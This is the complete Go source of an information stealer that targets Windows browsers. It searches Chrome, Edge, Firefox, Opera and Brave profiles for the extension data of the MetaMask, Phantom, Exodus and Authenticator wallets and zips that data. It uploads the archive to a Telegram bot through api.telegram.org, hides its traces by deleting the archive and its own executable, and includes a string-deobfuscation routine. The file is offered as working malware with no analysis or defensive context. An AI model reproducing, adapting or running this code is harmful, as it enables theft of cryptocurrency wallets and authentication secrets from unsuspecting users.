//SophosVx

package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
	"syscall"
	"encoding/base64"
)

var (
	xor_key  = []byte{0xDE, 0xAD, 0xBE, 0xEF}
	bot_token = "TELEGRAM_BOT_TOKEN"
	chat_id   = "TELEGRAM_CHAT_ID"
)

type extension struct {
	id   string
	name string
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

type browser struct {
	name  string
	paths []string
}

func main() {
	wallets := get_wallets()
	browsers := get_browsers()

	zip_file, zip_writer := create_zip()
	defer func() {
		zip_writer.Close()
		zip_file.Close()
	}()

	var wg sync.WaitGroup
	write_queue := make(chan struct{}, 1)
	extensions_found := make(map[string][]string)

	for _, browser := range browsers {
		for _, base_path := range browser.paths {
			wg.Add(1)
			go process_browser(zip_writer, browser, base_path, wallets, &wg, write_queue, extensions_found)
		}
	}

	wg.Wait()

	zip_writer.Close()
	zip_file.Close()
	send_message(zip_file.Name(), extensions_found)

	err := os.Remove(zip_file.Name())
	if err != nil {
		return
	}

	cmd := exec.Command("cmd", "/C", "start", "/B", "del", "/F", "/Q", os.Args[0])
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
}

func gen_string(n int) string {
	var letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[r.Intn(len(letters))]
	}
	return string(b)
}

func get_wallets() []extension {
	return []extension{
		{id: "nkbihfbeogaeaoehlefnkodbefgpgknn", name: "Metamask"},
		{id: "bfnaelmomeimhlpmgjnjophhpkkoljpa", name: "Phantom"},
		{id: "aholpfdialjgjfhomihkjbmgjidlcdno", name: "Exodus"},
		{id: "bhghoamapcdpbohphigoooaddinpkbai", name: "Authenticator"},
	}
}

func get_browsers() []browser {
	local_app_data_path := os.Getenv("LOCALAPPDATA")
	roaming_app_data_path := os.Getenv("APPDATA")

	return []browser{
		{name: "Google Chrome", paths: []string{filepath.Join(local_app_data_path, "Google", "Chrome", "User Data")}},
		{name: "Microsoft Edge", paths: []string{filepath.Join(local_app_data_path, "Microsoft", "Edge", "User Data")}},
		{name: "Mozilla Firefox", paths: []string{filepath.Join(roaming_app_data_path, "Mozilla", "Firefox", "Profiles")}},
		{name: "Opera", paths: []string{filepath.Join(roaming_app_data_path, "Opera Software", "Opera Stable")}},
		{name: "Brave", paths: []string{filepath.Join(local_app_data_path, "BraveSoftware", "Brave-Browser", "User Data")}},
	}
}

func create_zip() (*os.File, *zip.Writer) {
	temp_dir := os.TempDir()
	zip_file_name := gen_string(25) + ".zip"
	zip_file_path := filepath.Join(temp_dir, zip_file_name)

	zip_file, _ := os.Create(zip_file_path)
	zip_writer := zip.NewWriter(zip_file)

	return zip_file, zip_writer
}

func process_extension(zip_writer *zip.Writer, browser browser, path string, wallet extension, wg *sync.WaitGroup, write_queue chan struct{}, extensions_found map[string][]string) {
	defer wg.Done()
	extension_path := filepath.Join(path, wallet.id)
	if _, err := os.Stat(extension_path); err == nil {
		filepath.Walk(extension_path, func(path string, info os.FileInfo, walk_err error) error {
			if walk_err != nil || info == nil {
				return walk_err
			}
			rel_path := filepath.Join(browser.name, wallet.name, path[len(extension_path):])

			if info.IsDir() {
				write_queue <- struct{}{}
				zip_writer.Create(rel_path + "/")
				<-write_queue
				return nil
			}

			var file *os.File
			var open_err error
			for i := 0; i < 3; i++ {
				file, open_err = os.Open(path)
				if open_err == nil {
					break
				}
				time.Sleep(100 * time.Millisecond)
			}
			if open_err != nil {
				return open_err
			}
			defer file.Close()

			write_queue <- struct{}{}
			zip_file_writer, _ := zip_writer.Create(rel_path)
			io.Copy(zip_file_writer, file)
			<-write_queue

			if !contains(extensions_found[browser.name], wallet.name) {
				extensions_found[browser.name] = append(extensions_found[browser.name], wallet.name)
			}

			return nil
		})
	}
}

func process_browser(zip_writer *zip.Writer, browser browser, base_path string, wallets []extension, wg *sync.WaitGroup, write_queue chan struct{}, extensions_found map[string][]string) {
	defer wg.Done()
	filepath.Walk(base_path, func(path string, info os.FileInfo, err error) error {
		if err != nil || info == nil {
			return err
		}
		if info.IsDir() && (filepath.Base(path) == "Local Extension Settings" || filepath.Base(path) == "Profiles") {
			for _, wallet := range wallets {
				wg.Add(1)
				go process_extension(zip_writer, browser, path, wallet, wg, write_queue, extensions_found)
			}
		}
		return nil
	})
}

func send_message(zip_file_path string, extensions_found map[string][]string) {
	file, err := os.Open(zip_file_path)
	if err != nil {
		return
	}
	defer file.Close()

	var request_body bytes.Buffer
	writer := multipart.NewWriter(&request_body)
	part, err := writer.CreateFormFile("document", filepath.Base(zip_file_path))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.WriteField("chat_id", chat_id)

	var message strings.Builder
	message.WriteString("Extensions found:\n")
	for browser, extensions := range extensions_found {
		message.WriteString(fmt.Sprintf("%s:\n", browser))
		for _, extension := range extensions {
			message.WriteString(fmt.Sprintf(" - %s\n", extension))
		}
	}
	writer.WriteField("caption", message.String())

	writer.Close()

	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+bot_token+"/sendDocument", &request_body)
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func deobf_str(input string, xor_key []byte) string {
	input_bytes, _ := base64.StdEncoding.DecodeString(input)
	key_len := len(xor_key)
	output := make([]byte, len(input_bytes))

	for i, b := range input_bytes {
		b = (b ^ 0xAA) - 3
		b = ^b
		b = (b >> 4) | (b << 4)
		output[i] = b ^ xor_key[i%key_len]
	}

	decoded_output, _ := base64.StdEncoding.DecodeString(string(output))
	return string(decoded_output)
}